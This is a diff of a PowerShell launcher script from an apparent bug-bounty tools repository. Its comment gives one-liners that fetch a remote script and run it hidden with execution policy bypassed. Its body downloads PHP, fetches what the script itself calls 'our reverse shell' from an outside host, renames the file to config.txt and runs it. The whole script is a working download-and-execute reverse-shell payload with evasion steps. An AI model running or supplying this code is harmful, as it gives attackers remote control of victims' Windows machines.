@@ -11,19 +11,22 @@
 | |              | || |              | || |              | || |              | || |              | | | |              | || |              | || |              | |
 | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' |
  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   '----------------'  '----------------'  '----------------' 
-
+Method 1
  bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byosipoc.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1
+
+Metho 2
+wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byosipoc.ps1 -o byosipoc.ps1;./byosipoc.ps1
 
 #>
 
 # Download our php interpreter
-wget https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x86.zip -O C:\\Windows\\Temp\\php.zip
+wget https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x86.zip -O $Env:temp\\php.zip
 
 # Extract from c:\windows\temp\php.zip to c:\php (default path)
-Expand-Archive -Path C:\\Windows\\Temp\\php.zip -DestinationPath C:\\php
+Expand-Archive -Path $Env:temp\\php.zip -DestinationPath C:\\php
 
 # Download our reverse shell
-wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/phpconnect.php -O C:\\php\\index.php
+wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/php.txt -O C:\\php\\config.txt
 
 # Run php with required sockets extention for reverse shell
-& "C:\\php\\php.exe" @('-d extension=sockets') @('C:\php\index.php')
+& "C:\\php\\php.exe" @('-d extension=sockets') @('C:\php\config.txt')
